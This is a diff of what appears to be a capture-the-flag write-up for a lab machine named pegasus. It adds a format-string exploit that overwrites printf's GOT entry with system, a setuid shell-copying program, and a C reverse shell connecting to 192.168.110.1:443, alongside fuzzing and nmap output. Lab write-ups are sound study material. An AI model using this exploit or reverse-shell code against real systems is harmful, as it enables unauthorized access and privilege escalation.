@@ -88,10 +88,9 @@ Target: http://192.168.110.39:8088/FUZZ.php
 Total requests: 220560
 
 =====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                    
+ID           Response   Lines    Word       Chars       Payload
 =====================================================================
-
-000000185:   200        0 L      4 W        19 Ch       "submit"                                                                                                                   
+000000185:   200        0 L      4 W        19 Ch       "submit"                                   
 000089234:   200        14 L     58 W       488 Ch      "codereview"    
 ```
 
@@ -388,8 +387,10 @@ int quit()
 ```
 
 ```console
+
 #desactive ALSR
 ulimit -s unlimited
+
 ```
 
 
@@ -413,12 +414,13 @@ input1 = "1\n\10\n"
 #input1 += ".%x"*8
 #input1 += "0x%8$n"
 
-system =p(0x40069060)
-printf = p(0x8049bfc)
+# Remplacer printf par system
+printf =   p(0x8049bfc)
 printf_0 = p(0x8049bfc)
 printf_2 = p(0x8049bfc+2)
 input1 += printf_0
 input1 += printf_2
+system = p(0x40069060)
 #0x9060
 input1 += "%36952x%8$hn"
 #0x4006
@@ -432,6 +434,58 @@ input1 += "4\n"
 print input1
 
 ```
+```c
+mike@pegasus:~$ cat tojohn.c
+#include <stdio.h>
+int main()
+{
+    system("cp /bin/sh /tmp/tojohn");
+    system("chmod 4777 /tmp/tojohn");
+}
+```
+
+```console
+mike@pegasus:~$ gcc tojohn.c -o "Selection:"
+
+```
+
+```c
+// cat shell.c 
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+int main(int argc, char *argv[])
+{
+    struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr("192.168.110.1");
+    sa.sin_port = htons(443);
+
+    s = socket(AF_INET, SOCK_STREAM, 0); 
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execve("/bin/sh", 0, 0);
+    return 0; 
+}
+
+
+```
+
+```console
+
+mike@pegasus:~$ gcc shell.c -o "Selection:"
+
+```
+
+
 
 ```console
 mike@pegasus:~$ export PATH=$PATH:/home/mike
@@ -471,7 +525,7 @@ john@pegasus:~$ cat /etc/exports | grep  -v ^#
 john@pegasus:~$ sudo /usr/local/sbin/nfs start
 
 ```
-```terminal
+```console
 └─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.39
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 17:04 CEST
